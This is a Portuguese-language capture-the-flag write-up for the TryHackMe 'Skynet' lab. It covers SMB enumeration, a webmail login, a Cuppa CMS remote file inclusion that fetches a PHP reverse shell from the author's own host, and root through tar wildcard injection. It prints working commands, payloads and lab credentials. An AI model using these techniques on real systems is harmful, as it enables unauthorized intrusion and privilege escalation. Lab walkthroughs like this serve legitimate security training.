# Write-up: Skynet - TryHackMe

> **Data:** 03 de Março de 2026  
> **Target IP:** `10.67.176.22`

![Status](https://img.shields.io/badge/Status-Comprometimento%20Total-red?style=for-the-badge) 
![Initial Access](https://img.shields.io/badge/Initial%20Access-RFI%20%7C%20Cuppa%20CMS-orange?style=for-the-badge)
![PrivEsc](https://img.shields.io/badge/PrivEsc-Tar%20Wildcard%20Injection-blue?style=for-the-badge)

---

O desafio **Skynet** é um laboratório focado em reconhecimento e exploração de falhas em serviços comuns como SMB, POP3 e aplicações web.
## 1. Reconhecimento
Iniciei com um scan para identificar serviços e versões:
```bash
nmap -sV -sC -A 10.67.176.22
```
Vetores Identificados:
- Porta 80 (HTTP): Apache 2.4.18.
- Portas 139/445 (SMB): Samba 4.3.11.
- Porta 110 (POP3): Dovecot POP3d.

### 1.1 Enumeração SMB
Constatando a existência de compartilhamentos acessíveis sem autenticação:
```bash
smbclient -L //10.67.176.22 -N
```
    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    anonymous       Disk      Skynet Anonymous Share
    milesdyson      Disk      Miles Dyson Personal Share
    IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
No share anonymous, encontrei o arquivo log1.txt, que continha uma wordlist de senhas, e o attention.txt, que confirmou o nome do usuário alvo: milesdyson.

### 1.2 Webmail e Credenciais

Utilizei o diretório `/squirrelmail` (identificado via Gobuster) e a wordlist `log1.txt` para comprometer a conta de e-mail.
```
gobuster dir -u [http://10.67.176.22](http://10.67.176.22) -w /usr/share/wordlists/dirb/common.txt
```
**Credenciais de E-mail:** `milesdyson : cyborg007haloterminator`

Dentro da caixa de entrada, recuperei a senha do Samba em um e-mail de "Password Reset" e a localização de um diretório oculto.
No webmail, encontrei um e-mail com o assunto "Samba Password reset" contendo a nova senha do Miles: `)s{A&2Z=F^n_E.B``.

## 2. Acesso Inicial
### 2.1 Invasão do Share Privado
Com a senha em mãos, acessei os arquivos pessoais do Miles:
```
smbclient //10.67.176.22/milesdyson -U 'milesdyson%)s{A&2Z=F^n_E.B`'
```
Dentro da pasta notes, li o arquivo important.txt, que revelou um diretório oculto no servidor web utilizado para testes de um CMS beta: /45kra24zxs28v3yd.

### 2.2 Exploração de RFI (Remote File Inclusion)
O diretório oculto revelou o uso do Cuppa CMS. Pesquisei vulnerabilidades públicas para este sistema:
```
searchsploit cuppa
```
A falha reside no arquivo /administrator/alerts/alertConfigField.php, que permite a inclusão de arquivos remotos via parâmetro urlConfig.

Execução do Reverse Shell:

Clonei o shell PHP do Kali:
```
cp /usr/share/webshells/php/php-reverse-shell.php shell.php (configurei-o com meu IP da VPN e porta 4444).
```
Subi um servidor Python:
```
python3 -m http.server 80.
```
Iniciei o Netcat:
```
nc -lvnp 4444.
```
Chamei o exploit via navegador:
```
http://10.67.176.22/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<SeuIP>/shell.php
```
No Netcat a conexão será estabelecida:

```
listening on [any] 4444 ...
connect to [192.168.145.31] from (UNKNOWN) [10.67.176.22] 50392
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:02:54 up 42 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Estabilização da Shell:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Com isso é só buscar o arquivo do usuário e obter a primeira flag.

## 3. Escalação de Privilégios
### 4.1 Vulnerabilidade de Cronjob e Wildcard
Analisei as tarefas agendadas do sistema:
`cat /etc/crontab`

Havia um script executado pelo **root** a cada minuto: `/home/milesdyson/backups/backup.sh`. O script utilizava o comando `tar` com um caractere curinga (`*`) na pasta `/var/www/html`.

### 4.2 Tar Wildcard Injection

Exploitei a falha criando arquivos que o `tar` interpreta como argumentos de comando:
```
cd /var/www/html
echo 'chmod +s /bin/bash' > root.sh
touch ./--checkpoint=1
touch "./--checkpoint-action=exec=sh root.sh"
```
Temos o root! 🚩

**Escrito por:** [Ralph Sonato](https://www.linkedin.com/in/ralph-sonato-77086b16b/)  
*Analista de Cibersegurança*
